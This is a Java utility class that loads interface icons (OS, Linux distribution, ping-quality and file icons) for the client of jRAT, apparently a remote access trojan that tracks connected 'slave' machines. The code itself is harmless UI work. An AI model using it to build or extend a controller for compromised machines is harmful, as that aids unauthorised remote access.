package se.jrat.client.utils;

import java.io.File;
import java.net.URL;
import java.util.Random;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.filechooser.FileSystemView;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.ui.frames.Frame;
import se.jrat.common.OperatingSystem;


public class IconUtils {
	
	public static final ImageIcon OS_WIN = IconUtils.getIcon("os");
	public static final ImageIcon OS_WIN8 = IconUtils.getIcon("os_win8");
	public static final ImageIcon OS_MAC = IconUtils.getIcon("os_mac");
	public static final ImageIcon OS_LINUX = IconUtils.getIcon("os_linux");
	public static final ImageIcon OS_ANDROID = IconUtils.getIcon("NONE"); //TODO
	public static final ImageIcon OS_OTHERS = IconUtils.getIcon("last_modified");
	
	public static final ImageIcon DIST_UBUNTU = IconUtils.getIcon("dist_ubuntu");
	public static final ImageIcon DIST_KALI = IconUtils.getIcon("dist_kali");
	public static final ImageIcon DIST_CENTOS = IconUtils.getIcon("dist_centos");
	public static final ImageIcon DIST_DEBIAN = IconUtils.getIcon("dist_debian");
	public static final ImageIcon DIST_ELEMENTARY = IconUtils.getIcon("dist_elementaryos");

	public static ImageIcon getIcon(String name, boolean defaultfolder) {
		URL url;
		if (defaultfolder) {
			url = Main.class.getResource("/icons/" + name + ".png");
		} else {
			url = Main.class.getResource(name);
		}

		if (url != null) {
			return new ImageIcon(url);
		} else {
			return null;
		}
	}

	public static ImageIcon getIcon(String name) {
		return getIcon(name, true);
	}

	public static ImageIcon getPingIcon(AbstractSlave slave) {
		int ping = 0;
		if (slave.getPing() < 50) {
			ping = 0;
		} else if (slave.getPing() < 100) {
			ping = 1;
		} else if (slave.getPing() < 200) {
			ping = 2;
		} else if (slave.getPing() < 400) {
			ping = 3;
		} else if (slave.getPing() < 1000) {
			ping = 4;
		} else {
			ping = 5;
		}

		String str = null;

		if (Frame.pingmode == Frame.PING_ICON_DOT) {
			str = "/icons/ping" + ping + ".png";
		} else {
			if (ping == 0 || ping == 1) {
				str = "network_green";
			} else if (ping == 2 || ping == 3) {
				str = "network_yellow";
			} else if (ping == 4) {
				str = "network_red";
			} else {
				str = "network_offline";
			}
		}

		ImageIcon icon;

		if (Utils.pingicons.containsKey(str)) {
			icon = Utils.pingicons.get(str);
		} else if (Frame.pingmode == Frame.PING_ICON_DOT) {
			icon = new ImageIcon(Main.class.getResource(str));
			Utils.pingicons.put(str, icon);
		} else {
			icon = getIcon(str);
			Utils.pingicons.put(str, icon);
		}

		return icon;
	}
	
	public static ImageIcon getOSIcon(AbstractSlave slave) {
		ImageIcon icon;
		
		if (slave.getOS() == OperatingSystem.WINDOWS) {
			if (slave.getOperatingSystem().startsWith("Windows 8")) {
				icon = OS_WIN8;
			} else {
				icon = OS_WIN;
			}
		} else if (slave.getOS() == OperatingSystem.OSX) {
			icon = OS_MAC;
		} else if (slave.getOS() == OperatingSystem.LINUX) {
			if (slave.getOperatingSystem().toLowerCase().contains("ubuntu")) {
				icon = DIST_UBUNTU;
			} else if (slave.getOperatingSystem().toLowerCase().contains("kali") || slave.getOperatingSystem().toLowerCase().contains("backtrack")) {
				icon = DIST_KALI;
			} else if (slave.getOperatingSystem().toLowerCase().contains("centos")) {
				icon = DIST_CENTOS;
			} else if (slave.getOperatingSystem().toLowerCase().contains("debian")) {
				icon = DIST_DEBIAN;
			} else if (slave.getOperatingSystem().toLowerCase().contains("elementary")) {
				icon = DIST_ELEMENTARY;
			} else {
				icon = OS_LINUX;
			}
		} else if (slave.getOS() == OperatingSystem.ANDROID) {
			icon = OS_ANDROID;
		} else {
			icon = OS_OTHERS;
		}
		
		return icon;
	}

	public static ImageIcon getFileIcon(int mode) {
		if (mode == IconUtils.IMAGE_FILE) {
			return new ImageIcon(Main.class.getResource("/icons/file.png"));
		} else if (mode == IconUtils.IMAGE_FOLDER) {
			return new ImageIcon(Main.class.getResource("/icons/folder.png"));
		} else {
			return null;
		}
	}

	public static Icon getFolderIcon() {
		return getFileIconFromExtension("", true);
	}

	public static Icon getFileIconFromExtension(String f, boolean dir) {
		if (dir) {
			try {
				File temp = new File(System.getProperty("java.io.tmpdir") + "icon");
				temp.mkdirs();
				Icon icon = FileSystemView.getFileSystemView().getSystemIcon(temp);
				temp.delete();
				return icon;
			} catch (Exception ex) {
				return getFileIcon(IconUtils.IMAGE_FOLDER);
			}
		} else {
			try {
				File temp = File.createTempFile((new Random()).nextInt() + "", f.substring(f.lastIndexOf("."), f.length()));
				Icon icon = FileSystemView.getFileSystemView().getSystemIcon(temp);
				temp.delete();
				return icon;
			} catch (Exception ex) {
				return getFileIcon(IconUtils.IMAGE_FILE);
			}
		}
	}

	public static Icon getFileIcon(File f) {
		Icon icon = FileSystemView.getFileSystemView().getSystemIcon(f);
		return icon;
	}

	public static Icon getFileIcon(String f) {
		return getFileIcon(new File(f));
	}

	public static final int IMAGE_FOLDER = 0;
	public static final int IMAGE_FILE = 1;

}
